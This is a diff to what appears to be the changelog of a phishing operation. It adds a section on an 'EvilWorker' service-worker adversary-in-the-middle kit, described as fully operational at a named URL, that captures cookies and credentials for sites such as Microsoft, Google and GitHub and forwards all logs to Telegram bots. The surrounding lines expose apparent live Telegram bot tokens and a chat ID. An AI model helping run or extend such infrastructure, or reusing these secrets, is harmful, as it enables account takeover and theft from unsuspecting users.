@@ -79,6 +79,18 @@ August 15, 2025 - Added Telegram bot integration and personal account support
 - **Bot 2**: `7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U`
   - **Chat ID**: `6263177378`
 
+### EvilWorker Integration (Latest)
+- **URL**: `https://evilworker-vercel.vercel.app/`
+- **Status**: ✅ **FULLY OPERATIONAL**
+- **Features**: 
+  - Service Worker-based AiTM attacks
+  - Automatic traffic interception
+  - Real-time Telegram notifications to both bots
+  - Cookie and credential capture
+  - Works with any website (Microsoft, Google, GitHub, etc.)
+  - No configuration files needed (unlike Evilginx2)
+- **Telegram Integration**: Sends ALL logs to both bots with EvilWorker identification
+
 ### Enhanced Monitoring & Logging
 - **Real-time Alerts**: Every request logged with IP, method, URL, user-agent
 - **Email Tracking**: Separate alerts for email entry and password submission
